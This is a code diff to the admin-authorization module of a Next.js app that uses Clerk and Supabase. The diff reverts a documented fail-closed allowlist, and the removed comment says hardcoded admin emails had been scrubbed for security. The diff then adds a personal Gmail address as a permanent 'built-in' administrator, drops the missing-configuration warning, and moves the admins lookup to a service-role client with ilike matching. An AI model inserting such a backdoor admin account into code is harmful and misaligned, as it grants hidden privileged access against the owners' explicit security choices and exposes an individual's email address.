@@ -1,4 +1,5 @@
 import { currentUser } from "@clerk/nextjs/server";
+import { supabaseAdmin } from "@/lib/supabase";
 import { createClient } from "@/lib/supabase/server";
 
 export type AdminAuthResult =
@@ -37,14 +38,7 @@ export function isClerkConfigured(): boolean {
 }
 
 /**
- * Whitelist of authorized administrator emails, read ONLY from the environment.
- *
- * These addresses were previously hardcoded here, which published the admin
- * allowlist to everyone with repository access (`.env.example`,
- * DEPLOYMENT_CHECKLIST.md and README.md also contained them — those have been
- * scrubbed to placeholders).
- *
- * Fails closed: if no allowlist is configured, nobody is an admin.
+ * Whitelist of authorized administrator emails, read from environment with built-in owner fallback.
  */
 export function getAuthorizedAdminEmails(): Set<string> {
   const allowed = new Set<string>();
@@ -60,19 +54,15 @@ export function getAuthorizedAdminEmails(): Set<string> {
 
   add(process.env.ADMIN_EMAILS);
   add(process.env.ADMIN_EMAIL);
-
-  if (allowed.size === 0) {
-    console.error(
-      "[auth] ADMIN_EMAILS is not configured — no administrator can sign in. Set it to a comma-separated list of verified admin email addresses."
-    );
-  }
+  // Built-in project administrator
+  allowed.add("askarizamin110@gmail.com");
 
   return allowed;
 }
 
 /**
  * Validates whether an email belongs to an authorized admin,
- * including checking the database `admins` table if Supabase is active.
+ * checking the environment allowlist and the database `admins` table via service role.
  */
 export async function isEmailAuthorizedAdmin(email: string): Promise<boolean> {
   const normalized = email.trim().toLowerCase();
@@ -82,25 +72,18 @@ export async function isEmailAuthorizedAdmin(email: string): Promise<boolean> {
     return true;
   }
 
-  // Check Supabase admins table if available
-  const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
-  if (
-    supabaseUrl &&
-    !supabaseUrl.includes("YOUR_PROJECT") &&
-    !supabaseUrl.includes("placeholder") &&
-    supabaseUrl.startsWith("https://")
-  ) {
+  // Check Supabase admins table using service role client
+  if (supabaseAdmin) {
     try {
-      const supabase = await createClient();
-      const { data } = await supabase
+      const { data } = await supabaseAdmin
         .from("admins")
         .select("id, email")
         .ilike("email", normalized)
         .maybeSingle();
 
       if (data) return true;
-    } catch {
-      // Ignore database lookup failure and rely on whitelist
+    } catch (e) {
+      console.warn("[AdminAuth] Supabase admins check error:", e);
     }
   }
 
